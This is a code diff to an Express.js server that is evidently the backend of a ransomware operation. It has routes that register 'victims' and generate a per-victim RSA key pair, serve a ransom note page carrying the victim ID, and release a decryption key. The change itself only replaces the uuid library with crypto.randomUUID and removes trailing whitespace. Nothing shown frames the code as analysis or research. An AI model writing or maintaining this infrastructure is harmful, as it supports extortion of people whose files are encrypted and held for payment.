@@ -1,5 +1,5 @@
 const express = require('express');
-const { v4: uuidv4 } = require('uuid');
+const crypto = require('crypto');
 const path = require('path');
 const fs = require('fs');
 const { generateRSAKeyPair } = require('../crypto/keygen');
@@ -14,11 +14,11 @@ const router = express.Router();
  */
 router.post('/register', (req, res) => {
     try {
-        const victimId = 'V-' + uuidv4().substring(0, 8).toUpperCase();
-        
+        const victimId = 'V-' + crypto.randomUUID().substring(0, 8).toUpperCase();
+
         // Generate Keys
         const { publicKey, privateKey } = generateRSAKeyPair();
-        
+
         // Save to DB
         db.saveVictim({
             id: victimId,
@@ -43,7 +43,7 @@ router.post('/register', (req, res) => {
  */
 router.get('/ransom/:victimId', (req, res) => {
     const victim = db.getVictim(req.params.victimId);
-    
+
     if (!victim) {
         return res.status(404).send("Victim not found.");
     }
@@ -56,7 +56,7 @@ router.get('/ransom/:victimId', (req, res) => {
 
     let html = fs.readFileSync(templatePath, 'utf8');
     html = html.replace(/{{VICTIM_ID}}/g, victim.id);
-    
+
     res.send(html);
 });
 
@@ -66,7 +66,7 @@ router.get('/ransom/:victimId', (req, res) => {
  */
 router.post('/decrypt-key/:victimId', (req, res) => {
     const victim = db.getVictim(req.params.victimId);
-    
+
     if (!victim) {
         return res.status(404).json({ error: "Victim not found" });
     }
